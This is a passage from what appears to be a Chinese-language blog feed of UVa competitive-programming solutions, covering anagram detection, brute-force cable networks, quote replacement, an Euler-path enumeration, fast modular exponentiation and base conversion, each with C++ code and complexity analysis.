class="built_in">cout</span>&lt;&lt;<span class="string">"\n"</span>;</span><br><span class="line">		<span class="keyword">else</span> out=<span class="literal">true</span>;</span><br><span class="line">		</span><br><span class="line">		found=<span class="literal">false</span>;		</span><br><span class="line">		start_x = start_y = end_x = end_y = <span class="number">-1</span>;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;n ; i++)&#123;</span><br><span class="line">			<span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span> ; j&lt;m ; j++)&#123;</span><br><span class="line">				used[i][j] = <span class="literal">false</span>;</span><br><span class="line">				<span class="built_in">cin</span>&gt;&gt;arr[i][j];</span><br><span class="line">				<span class="keyword">if</span>((i==<span class="number">0</span> || i==n<span class="number">-1</span> || j==<span class="number">0</span> || j==m<span class="number">-1</span>) &amp;&amp; arr[i][j]==<span class="string">'.'</span>)&#123;</span><br><span class="line">					<span class="keyword">if</span>(start_x == <span class="number">-1</span>)&#123;</span><br><span class="line">						start_x = i;</span><br><span class="line">						start_y = j;</span><br><span class="line">						<span class="keyword">if</span>(i==<span class="number">0</span>) start_dir = <span class="number">2</span>;</span><br><span class="line">						<span class="keyword">else</span> <span class="keyword">if</span>(i==n<span class="number">-1</span>) start_dir = <span class="number">0</span>;</span><br><span class="line">						<span class="keyword">else</span> <span class="keyword">if</span>(j==<span class="number">0</span>) start_dir = <span class="number">1</span>;</span><br><span class="line">						<span class="keyword">else</span> start_dir = <span class="number">3</span>;</span><br><span class="line">					&#125;</span><br><span class="line">					<span class="keyword">else</span>&#123;</span><br><span class="line">						end_x = i;</span><br><span class="line">						end_y = j;</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		DFS(start_x, start_y, start_dir);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="時間複雜度分析"><a href="#時間複雜度分析" class="headerlink" title="時間複雜度分析"></a>時間複雜度分析</h3><p>每筆輸入時間複雜度為 $O(nm)$</p>
<p>DFS 每層最多有 $2$ 種選擇，最多有 $nm$ 層</p>
<p>DFS 時間複雜度為 $O(2^{nm})$</p>
<p>每筆測資總時間複雜度為 $O(nm + 2^{nm})$</p>
]]></content>
      <categories>
        <category>UVa</category>
      </categories>
      <tags>
        <tag>DFS</tag>
        <tag>UVa</tag>
      </tags>
  </entry>
  <entry>
    <title>UVa 156</title>
    <url>/2021/03/23/UVa156/</url>
    <content><![CDATA[<h1 id="UVa-156"><a href="#UVa-156" class="headerlink" title="UVa 156"></a>UVa 156</h1><h2 id="題目"><a href="#題目" class="headerlink" title="題目"></a>題目</h2><p><a href="http://domen111.github.io/UVa-Easy-Viewer/?156" target="_blank" rel="noopener">http://domen111.github.io/UVa-Easy-Viewer/?156</a></p>
<p>定義一個字串是 anagrams ，如果這個字串的任何排列方式除了本身以外都不是一個存在的單詞，我們就稱這個字串是 anagrams</p>
<p>現在給你很多的字串，這些字串組成了字典，問在這本字典當中有哪些字串是 anagrams</p>
<p>注意，在判斷 anagrams 時不需要理會大小寫</p>
<p>但是輸出時需要理會大小寫，並且依照字典序排序</p>
<h2 id="想法"><a href="#想法" class="headerlink" title="想法"></a>想法</h2><p>如果說字串 $A$ 經過排列後可以形成字串 $B$，那麼字串 $A, B$ 分別經過排序之後得到的 $A’, B’$ 也就會相等</p>
<p>依照這樣的性質，我們建立一個新的結構(struct)，紀錄字典當中每個字轉成小寫並且經過排序後的樣子、以及原字串在字典當中的編號</p>
<p>那麼這個新的結構所組成的新字串陣列在經過排序之後，根據上面所得到的性質我們會發現，那些排列後相同的字串都會被排在一起</p>
<p>接下來我們只要篩掉這些字串，把剩餘的字串再透過編號對應回原本的字串，我們就拿到還沒排序過的答案了</p>
<p>最後經過排序就是正解</p>
<h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//By Koios1143</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">words</span>&#123;</span></span><br><span class="line">	<span class="built_in">string</span> word;</span><br><span class="line">	<span class="keyword">int</span> id;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> i=<span class="number">0</span>, l=<span class="number">0</span>;</span><br><span class="line"><span class="built_in">string</span> input, dict[<span class="number">1005</span>], output[<span class="number">1005</span>];</span><br><span class="line">words word[<span class="number">1005</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">cmp</span><span class="params">(words p, words q)</span></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(p.word.compare(q.word)!=<span class="number">0</span>) <span class="keyword">return</span> p.word &lt; q.word;</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">while</span>(<span class="built_in">cin</span>&gt;&gt;input &amp;&amp; input.compare(<span class="string">"#"</span>)!=<span class="number">0</span>)&#123;</span><br><span class="line">		<span class="comment">// 字典先存放一份原始檔</span></span><br><span class="line">		dict[i] = input;</span><br><span class="line">		</span><br><span class="line">		<span class="comment">// 都先轉換成小寫</span></span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span> ; j&lt;input.size() ; j++)&#123;</span><br><span class="line">			input[j] = <span class="built_in">tolower</span>(input[j]);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">// 接者把字串排序好</span></span><br><span class="line">		sort(input.begin(), input.end());</span><br><span class="line">		<span class="comment">//放進新的結構當中</span></span><br><span class="line">		word[i].word = input;</span><br><span class="line">		word[i].id = i;</span><br><span class="line">		i++;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 把新的結構所形成的陣列排序</span></span><br><span class="line">	sort(word, word+i, cmp);</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>, k ; j&lt;i ; )&#123;</span><br><span class="line">		<span class="keyword">for</span>(k=j ; k&lt;i ; k++)&#123;</span><br><span class="line">			<span class="keyword">if</span>(word[j].word.compare(word[k].word)!= <span class="number">0</span>) <span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>(k - j == <span class="number">1</span>)&#123;</span><br><span class="line">			<span class="comment">// 是 anagrams</span></span><br><span class="line">			output[l++] = dict[word[j].id];</span><br><span class="line">			j++;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="comment">// 不是 anagrams</span></span><br><span class="line">			j = k;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 輸出結果要排序</span></span><br><span class="line">	sort(output, output+l);</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span> ; j&lt;l ; j++)&#123;</span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;output[j]&lt;&lt;<span class="string">"\n"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="時間複雜度分析"><a href="#時間複雜度分析" class="headerlink" title="時間複雜度分析"></a>時間複雜度分析</h2><p>輸入時間複雜度 $O(n)$，$1 \leq n \leq 1000$</p>
<p>假設每個單詞的長度為 $s_i$， $S = \sum_{i = 0}^{n-1}s_i$</p>
<p>建立新陣列的時間複雜度為 $O(S + \sum_{i = 0}^{n-1}s_ilog{s_i})$</p>
<p>排序新陣列的時間複雜度為 $O(nlogn)$</p>
<p>篩選的時間複雜度為 $O(n)$</p>
<p>輸出結果排序時間複雜度約為 $O(nlogn)$</p>
<p>輸出時間複雜度約為 $O(n)$</p>
<p>總時間複雜度約為 $O(3n + nlogn + S + \sum_{i = 0}^{n-1}s_ilog{s_i})$</p>
]]></content>
      <categories>
        <category>UVa</category>
      </categories>
      <tags>
        <tag>UVa</tag>
      </tags>
  </entry>
  <entry>
    <title>UVa 216</title>
    <url>/2021/04/27/UVa216/</url>
    <content><![CDATA[<h1 id="UVa-216"><a href="#UVa-216" class="headerlink" title="UVa 216"></a>UVa 216</h1><p><a href="http://domen111.github.io/UVa-Easy-Viewer/?216" target="_blank" rel="noopener">http://domen111.github.io/UVa-Easy-Viewer/?216</a></p>
<p>在平面座標上有 $n$ 個點，我們要用 $n-1$ 條網路線連接這 $n$ 個點</p>
<p>為了安裝方便，兩台電腦之間會多預留 $16$ 呎的網路線</p>
<p>是否能找到一種連接方式，使得電腦都有網路線連接，並且網路線總長度最少</p>
<p>$2 \leq n \leq 8$</p>
<h2 id="想法"><a href="#想法" class="headerlink" title="想法"></a>想法</h2><p>這一題的 $n$ 很小，所以我們可以考慮比較暴力的作法</p>
<p>任意選擇一個起點，然後往下任意選擇下一個點，一直做到每個點都選擇到了，然後計算長度，把當前最短的長度所經過的點都記錄下來</p>
<h3 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//By Koios1143</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iomanip&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cmath&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> n, Case=<span class="number">1</span>, x[<span class="number">10</span>], y[<span class="number">10</span>], tmpx[<span class="number">10</span>], tmpy[<span class="number">10</span>], rx[<span class="number">10</span>], ry[<span class="number">10</span>];</span><br><span class="line"><span class="keyword">bool</span> used[<span class="number">10</span>];</span><br><span class="line"><span class="keyword">double</span> tot, min_dis;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 計算兩點之間距離</span></span><br><span class="line"><span class="function"><span class="keyword">double</span> <span class="title">dist</span><span class="params">(<span class="keyword">int</span> p, <span class="keyword">int</span> q, <span class="keyword">int</span> m, <span class="keyword">int</span> n)</span></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="built_in">sqrt</span>(<span class="built_in">pow</span>(p-m, <span class="number">2</span>) + <span class="built_in">pow</span>(q-n, <span class="number">2</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// path 紀錄當前網路線總長度</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dfs</span><span class="params">(<span class="keyword">int</span> depth, <span class="keyword">double</span> path)</span></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(depth == n)&#123;</span><br><span class="line">		<span class="keyword">if</span>(path &lt; min_dis)&#123;</span><br><span class="line">			min_dis = path;</span><br><span class="line">			<span class="comment">// 紀錄當前長度最短的路徑</span></span><br><span class="line">			<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;n ; i++)&#123;</span><br><span class="line">				rx[i] = tmpx[i];</span><br><span class="line">				ry[i] = tmpy[i];</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;n ; i++)&#123;</span><br><span class="line">		<span class="keyword">if</span>(!used[i])&#123;</span><br><span class="line">			used[i] = <span class="literal">true</span>;</span><br><span class="line">			tmpx[depth] = x[i];</span><br><span class="line">			tmpy[depth] = y[i];</span><br><span class="line">			<span class="keyword">if</span>(depth == <span class="number">0</span>) dfs(depth+<span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">			<span class="keyword">else</span> dfs(depth+<span class="number">1</span>, path+dist(tmpx[depth], tmpy[depth], tmpx[depth<span class="number">-1</span>], tmpy[depth<span class="number">-1</span>])+<span class="number">16</span>);</span><br><span class="line">			used[i] = <span class="literal">false</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">while</span>(<span class="built_in">cin</span>&gt;&gt;n &amp;&amp; n)&#123;</span><br><span class="line">		<span class="comment">// 初始化最小值是一個極大值</span></span><br><span class="line">		min_dis=<span class="number">2147483647</span>;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;n ; i++)&#123;</span><br><span class="line">			<span class="built_in">cin</span>&gt;&gt;x[i]&gt;&gt;y[i];</span><br><span class="line">			used[i] = <span class="literal">false</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		dfs(<span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;<span class="string">"**********************************************************\n"</span>;</span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;<span class="string">"Network #"</span>&lt;&lt;Case++&lt;&lt;<span class="string">"\n"</span>;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span> ; i&lt;n ; i++)&#123;</span><br><span class="line">			<span class="built_in">cout</span>&lt;&lt;<span class="string">"Cable requirement to connect ("</span>&lt;&lt;rx[i<span class="number">-1</span>]&lt;&lt;<span class="string">","</span>&lt;&lt;ry[i<span class="number">-1</span>]&lt;&lt;<span class="string">") to ("</span>&lt;&lt;rx[i]&lt;&lt;<span class="string">","</span>&lt;&lt;ry[i]&lt;&lt;<span class="string">") is "</span>&lt;&lt;fixed&lt;&lt;setprecision(<span class="number">2</span>)&lt;&lt;dist(rx[i<span class="number">-1</span>], ry[i<span class="number">-1</span>], rx[i], ry[i])+<span class="number">16</span>&lt;&lt;<span class="string">" feet.\n"</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;<span class="string">"Number of feet of cable required is "</span>&lt;&lt;min_dis&lt;&lt;<span class="string">".\n"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="時間複雜度分析"><a href="#時間複雜度分析" class="headerlink" title="時間複雜度分析"></a>時間複雜度分析</h3><p>每筆測資輸入時間複雜度為 $O(n)$</p>
<p>DFS 每一層最多有 $n$ 種選擇，總共有 $n$ 層，並且最後一層需要 $O(n)$ 的時間複製當前答案</p>
<p>每筆測資 DFS 時間複雜度為 $O(n^n \times n) = O(n^{n+1})$</p>
<p>每筆測資總時間複雜度約為 $O(n^{n+2})$</p>
]]></content>
      <categories>
        <category>UVa</category>
      </categories>
      <tags>
        <tag>DFS</tag>
        <tag>UVa</tag>
      </tags>
  </entry>
  <entry>
    <title>UVa 272</title>
    <url>/2021/03/23/UVa272/</url>
    <content><![CDATA[<h1 id="UVa-272"><a href="#UVa-272" class="headerlink" title="UVa 272"></a>UVa 272</h1><h2 id="題目"><a href="#題目" class="headerlink" title="題目"></a>題目</h2><p><a href="http://domen111.github.io/UVa-Easy-Viewer/?272" target="_blank" rel="noopener">http://domen111.github.io/UVa-Easy-Viewer/?272</a></p>
<p>給一篇文章，將每個 “” 對分別改寫成 `` 以及 ‘’</p>
<h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//By Koios1143</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="built_in">string</span> s;</span><br><span class="line">	<span class="keyword">bool</span> first=<span class="literal">true</span>;</span><br><span class="line">	<span class="keyword">while</span>(getline(<span class="built_in">cin</span>,s))&#123;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;s.size() ; i++)&#123;</span><br><span class="line">			<span class="keyword">if</span>(s[i]==<span class="string">'\"'</span>)&#123;</span><br><span class="line">				<span class="keyword">if</span>(first)</span><br><span class="line">					<span class="built_in">cout</span>&lt;&lt;<span class="string">"``"</span>;</span><br><span class="line">				<span class="keyword">else</span></span><br><span class="line">					<span class="built_in">cout</span>&lt;&lt;<span class="string">"''"</span>;</span><br><span class="line">				first=!first;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span></span><br><span class="line">				<span class="built_in">cout</span>&lt;&lt;s[i];</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;<span class="string">"\n"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="複雜度分析"><a href="#複雜度分析" class="headerlink" title="複雜度分析"></a>複雜度分析</h2><p>總時間複雜度為 $O(\Sigma len(s))$</p>
]]></content>
      <categories>
        <category>UVa</category>
      </categories>
      <tags>
        <tag>UVa</tag>
      </tags>
  </entry>
  <entry>
    <title>UVa 291</title>
    <url>/2021/04/27/UVa291/</url>
    <content><![CDATA[<h1 id="UVa-291"><a href="#UVa-291" class="headerlink" title="UVa 291"></a>UVa 291</h1><h2 id="題目"><a href="#題目" class="headerlink" title="題目"></a>題目</h2><p><a href="http://domen111.github.io/UVa-Easy-Viewer/?291" target="_blank" rel="noopener">http://domen111.github.io/UVa-Easy-Viewer/?291</a></p>
<p>如下圖所示，有編號 $1$~$5$ 的五個點，假設每一條邊都是雙向的</p>
<p>列出所有從 $1$ 開始每條邊最多只經過一次，並且每個點都有走到的情況，也就是一筆劃問題</p>
<p><img src="https://i.imgur.com/6aqms5F.png" alt=""></p>
<h2 id="想法"><a href="#想法" class="headerlink" title="想法"></a>想法</h2><p>要枚舉有哪些情況，就必須要先知道每個點可以連接到哪些點</p>
<p>我們可以預處理一張表，紀錄 $a$ 到 $b$ 是否有邊連通</p>
<p>接下來要符合一條邊的情況，就必須記錄每條邊是否被走過</p>
<p>一樣的，可以用一個表格紀錄 $a$ 到 $b$ 之間的邊是否被走過</p>
<p>最後就從 $1$ 點開始對於每個可以走的點都走過一次，枚舉出所有情況即可</p>
<h3 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//By Koios1143</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">bool</span> nxt[<span class="number">6</span>][<span class="number">6</span>];</span><br><span class="line"><span class="keyword">int</span> res[<span class="number">10</span>], vis[<span class="number">6</span>][<span class="number">6</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">DFS</span><span class="params">(<span class="keyword">int</span> depth, <span class="keyword">int</span> last)</span></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(depth == <span class="number">9</span>)&#123;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;<span class="number">9</span> ; i++)&#123;</span><br><span class="line">			<span class="built_in">cout</span>&lt;&lt;res[i];</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;<span class="string">"\n"</span>;</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span> ; i&lt;=<span class="number">6</span> ; i++)&#123;</span><br><span class="line">		<span class="comment">// 確認 last 到 i 之間的邊是否走過</span></span><br><span class="line">		<span class="keyword">if</span>(!vis[last][i] &amp;&amp; !vis[i][last] &amp;&amp; nxt[last][i])&#123;</span><br><span class="line">			vis[last][i] = vis[i][last] = <span class="literal">true</span>;</span><br><span class="line">			res[depth] = i;</span><br><span class="line">			DFS(depth+<span class="number">1</span>, i);</span><br><span class="line">			vis[last][i] = vis[i][last] = <span class="literal">false</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;<span class="number">6</span> ; i++)&#123;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span> ; j&lt;<span class="number">6</span> ; j++)&#123;</span><br><span class="line">			<span class="keyword">if</span>(i==<span class="number">0</span>) nxt[i][j] = <span class="literal">true</span>;</span><br><span class="line">			<span class="keyword">else</span> nxt[i][j] = <span class="literal">false</span>;</span><br><span class="line">			vis[i][j] = <span class="literal">false</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 建立兩個點之間是否有邊的表</span></span><br><span class="line">	nxt[<span class="number">1</span>][<span class="number">2</span>] = nxt[<span class="number">1</span>][<span class="number">3</span>] = nxt[<span class="number">1</span>][<span class="number">5</span>] = <span class="literal">true</span>;</span><br><span class="line">	nxt[<span class="number">2</span>][<span class="number">1</span>] = nxt[<span class="number">2</span>][<span class="number">3</span>] = nxt[<span class="number">2</span>][<span class="number">5</span>] = <span class="literal">true</span>;</span><br><span class="line">	nxt[<span class="number">3</span>][<span class="number">1</span>] = nxt[<span class="number">3</span>][<span class="number">2</span>] = nxt[<span class="number">3</span>][<span class="number">4</span>] = nxt[<span class="number">3</span>][<span class="number">5</span>] = <span class="literal">true</span>;</span><br><span class="line">	nxt[<span class="number">4</span>][<span class="number">3</span>] = nxt[<span class="number">4</span>][<span class="number">5</span>] = <span class="literal">true</span>;</span><br><span class="line">	nxt[<span class="number">5</span>][<span class="number">1</span>] = nxt[<span class="number">5</span>][<span class="number">2</span>] = nxt[<span class="number">5</span>][<span class="number">3</span>] = nxt[<span class="number">5</span>][<span class="number">4</span>] = <span class="literal">true</span>;</span><br><span class="line">	res[<span class="number">0</span>]=<span class="number">1</span>;</span><br><span class="line">	DFS(<span class="number">1</span>, <span class="number">1</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="時間複雜度分析"><a href="#時間複雜度分析" class="headerlink" title="時間複雜度分析"></a>時間複雜度分析</h3><p>DFS 每層最多 $4$ 種選擇，總共有 $8$ 層，時間複雜度為 $O(4^8)$</p>
]]></content>
      <categories>
        <category>UVa</category>
      </categories>
      <tags>
        <tag>DFS</tag>
        <tag>UVa</tag>
      </tags>
  </entry>
  <entry>
    <title>UVa374</title>
    <url>/2020/09/21/UVa374/</url>
    <content><![CDATA[<h2 id="題敘"><a href="#題敘" class="headerlink" title="題敘"></a>題敘</h2><p><a href="http://domen111.github.io/UVa-Easy-Viewer/?374" target="_blank" rel="noopener">http://domen111.github.io/UVa-Easy-Viewer/?374</a><br>給定三個整數 $B$ $P$ $M$ ，求 $B^P mod M$</p>
<h2 id="想法1-暴力解"><a href="#想法1-暴力解" class="headerlink" title="想法1 - 暴力解"></a>想法1 - 暴力解</h2><p>從 $1$ 開始到 $P$ ，每次乘上 $B$ 再模 $M$ ，複雜度 $O(P)$<br>但是複雜度過高，會TLE</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//By Koios1143</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ll long long</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> pii pair<span class="meta-string">&lt;int,int&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line">ll b,p,m;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">while</span>(<span class="built_in">cin</span>&gt;&gt;b&gt;&gt;p&gt;&gt;m)&#123;</span><br><span class="line">	    ll ans=<span class="number">1</span>;</span><br><span class="line">	    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span> ; i&lt;=p ; i++)&#123;</span><br><span class="line">	        ans = ans*b % m;</span><br><span class="line">	    &#125;</span><br><span class="line">	    <span class="built_in">cout</span>&lt;&lt;ans&lt;&lt;<span class="string">"\n"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="想法2-快速冪"><a href="#想法2-快速冪" class="headerlink" title="想法2 - 快速冪"></a>想法2 - 快速冪</h2><p>觀察我們計算的過程<br>如果我們要計算 $2^4$ ，我們會直接把 $2$ 乘 $4$ 次<br>但是實際上發現 $2^4 = (2^2)^2$<br>所以對於次數是偶數的，可以只計算一次，再來平方即可</p>
<p>而奇數呢?<br>假如我們要計算的 $3^3$<br>實際上會等同於 $3 * 3^2$<br>這樣一來一定能轉換成一次乘上偶數次</p>
<p>複雜度 $O(log_2 P)$</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//By Koios1143</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ll long long</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> pii pair<span class="meta-string">&lt;int,int&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line">ll b,p,m;</span><br><span class="line"></span><br><span class="line"><span class="function">ll <span class="title">solve</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> y,<span class="keyword">int</span> mod)</span></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(y==<span class="number">0</span>)</span><br><span class="line">		<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">	<span class="keyword">if</span>(y%<span class="number">2</span>)</span><br><span class="line">		<span class="keyword">return</span> (x*solve(x,y<span class="number">-1</span>,mod))%mod;</span><br><span class="line">	<span class="keyword">else</span>&#123;</span><br><span class="line">		ll half=solve(x,y/<span class="number">2</span>,mod);</span><br><span class="line">		<span class="keyword">return</span> (half*half)%mod;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">while</span>(<span class="built_in">cin</span>&gt;&gt;b&gt;&gt;p&gt;&gt;m)&#123;</span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;solve(b,p,m)&lt;&lt;<span class="string">"\n"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>UVa</category>
      </categories>
      <tags>
        <tag>遞迴</tag>
        <tag>UVa</tag>
        <tag>快速冪</tag>
      </tags>
  </entry>
  <entry>
    <title>UVa 389</title>
    <url>/2021/03/23/UVa389/</url>
    <content><![CDATA[<h1 id="UVa-389"><a href="#UVa-389" class="headerlink" title="UVa 389"></a>UVa 389</h1><p><a href="http://domen111.github.io/UVa-Easy-Viewer/?389" target="_blank" rel="noopener">http://domen111.github.io/UVa-Easy-Viewer/?389</a></p>
<p>給一個字串 $S$ 以及兩個數字 $n, m$ ，表示 $S$ 是 $n$ 進位底下的表示方式，求轉成 $m$ 進位制的樣子。</p>
<h2 id="想法"><a href="#想法" class="headerlink" title="想法"></a>想法</h2><ol>
<li>先將 $S$ 想辦法換成我們熟悉的數字表示方式十進位</li>
<li>統一從十進位轉換為其他進位制</li>
</ol>
<p>對於每個要轉換過去的單位數字 $p$</p>
<ol>
<li>$p&lt;10$<br> 轉換後為 <code>char(&#39;0&#39;+p)</code></li>
<li>$p&gt;=10$<br> 轉換後為 <code>char(&#39;A&#39;+p-10)</code></li>
</ol>
